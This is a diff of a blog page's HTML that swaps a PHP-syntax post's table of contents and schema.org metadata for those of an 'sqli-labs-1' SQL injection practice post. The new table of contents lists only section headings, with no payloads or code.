class="toc-item toc-level-3"><a class="toc-link" href="#strpos"><span class="toc-text">strpos()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#str-replace"><span class="toc-text">str_replace()</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="toc-text">SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%93%AA%E9%87%8C%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%EF%BC%9F"><span class="toc-text">哪里存在SQL注入？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5%E7%9A%84%E7%B1%BB%E5%9E%8B"><span class="toc-text">sql注入的类型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MySQL%E4%B8%AD3%E7%A7%8D%E6%B3%A8%E9%87%8A%E9%A3%8E%E6%A0%BC"><span class="toc-text">MySQL中3种注释风格</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="toc-text">判断注入点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4"><span class="toc-text">步骤</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E3%80%81%E5%88%A4%E6%96%AD%E5%88%97%E6%95%B0"><span class="toc-text">1、判断列数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%E3%80%81%E5%88%A4%E6%96%AD%E6%98%BE%E7%A4%BA%E4%BD%8D"><span class="toc-text">2、判断显示位</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3%E3%80%81%E8%8E%B7%E5%8F%96%E5%BD%93%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E7%A7%B0%E5%92%8C%E5%BD%93%E5%89%8D%E8%BF%9E%E6%8E%A5%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E7%94%A8%E6%88%B7"><span class="toc-text">3、获取当数据库名称和当前连接数据库的用户</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4%E3%80%81%E5%88%97%E5%87%BA%E6%89%80%E6%9C%89%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-text">4、列出所有数据库</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5%E3%80%81%E5%88%97%E5%87%BA-%E6%95%B0%E6%8D%AE%E5%BA%93%EF%BC%9Atest-%E4%B8%AD%E6%89%80%E6%9C%89%E7%9A%84%E8%A1%A8"><span class="toc-text">5、列出(数据库：test)中所有的表</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6%E3%80%81%E5%88%97%E5%87%BA%EF%BC%88%E6%95%B0%E6%8D%AE%E5%BA%93%EF%BC%9Atest-%E8%A1%A8%EF%BC%9Aadmin-%EF%BC%89%E4%B8%AD%E6%89%80%E6%9C%89%E7%9A%84%E5%AD%97%E6%AE%B5"><span class="toc-text">6、列出（数据库：test 表：admin ）中所有的字段</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7%E3%80%81%E5%88%97%E5%87%BA%EF%BC%88%E6%95%B0%E6%8D%AE%E5%BA%93%EF%BC%9Atest-%E8%A1%A8%EF%BC%9Aadmin-%EF%BC%89%E4%B8%AD%E7%9A%84%E6%95%B0%E6%8D%AE"><span class="toc-text">7、列出（数据库：test 表：admin ）中的数据</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqli-labs-1-1"><span class="toc-text">sqli-labs-1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%A8order-by%E7%8C%9C%E8%A7%A3%E5%88%97%E6%95%B0"><span class="toc-text">用order by猜解列数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%98%BE%E7%A4%BA%E5%9B%9E%E6%98%BE%E4%BD%8D"><span class="toc-text">显示回显位</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%86%E6%95%B0%E6%8D%AE"><span class="toc-text">爆数据</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E8%A1%A8%E5%90%8D"><span class="toc-text">查询表名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E5%88%97%E6%98%8E"><span class="toc-text">查询列明</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE"><span class="toc-text">查询数据</span></a></li></ol></li></ol></li></ol>
     </div>
   </section>
 
@@ -3422,7 +3500,7 @@ php EOF输出一段要输...</p>
 </script>
 
 
-  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"k10.","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"ChenZhengkai10","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":"这是我的专属博客"},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"k10."}},{"@type":"ListItem","position":2,"item":{"@id":"http://example.com/categories/php语法学习/","name":"php语法学习"}},{"@type":"ListItem","position":3,"item":{"@id":"http://example.com/2022/12/21/php学习2022-12-21/","name":"php学习2022-12-21"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"k10.","url":"http://example.com/","keywords":null,"description":"这是我的专属博客","author":{"@type":"Person","name":"ChenZhengkai10","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":"这是我的专属博客"},"publisher":{"@type":"Organization","name":"k10.","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"php学习2022-12-21","description":"php语法学习(常量、运算符、字符串函数)","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2022/12/21/php%E5%AD%A6%E4%B9%A02022-12-21/"},"author":{"@type":"Person","name":"ChenZhengkai10","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"k10.","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://example.com/2022/12/21/php%E5%AD%A6%E4%B9%A02022-12-21/","wordCount":21,"datePublished":"2022-12-21T08:09:10.000Z","dateModified":"2022-12-21T08:32:32.771Z","articleSection":"php语法学习","keywords":"php语法学习","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
+  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"k10.","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"ChenZhengkai10","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":"这是我的专属博客"},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"k10."}},{"@type":"ListItem","position":2,"item":{"@id":"http://example.com/categories/sqli-labs/","name":"sqli-labs"}},{"@type":"ListItem","position":3,"item":{"@id":"http://example.com/2022/12/21/sqli-labs-1/","name":"sqli-labs-1"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"k10.","url":"http://example.com/","keywords":null,"description":"这是我的专属博客","author":{"@type":"Person","name":"ChenZhengkai10","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":"这是我的专属博客"},"publisher":{"@type":"Organization","name":"k10.","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"sqli-labs-1","description":"这是我的专属博客","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2022/12/21/sqli-labs-1/"},"author":{"@type":"Person","name":"ChenZhengkai10","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"k10.","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://example.com/2022/12/21/sqli-labs-1/","wordCount":0,"datePublished":"2022-12-21T12:20:08.000Z","dateModified":"2022-12-21T14:00:34.855Z","articleSection":"sqli-labs","keywords":"sqli-labs","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
 
 
 
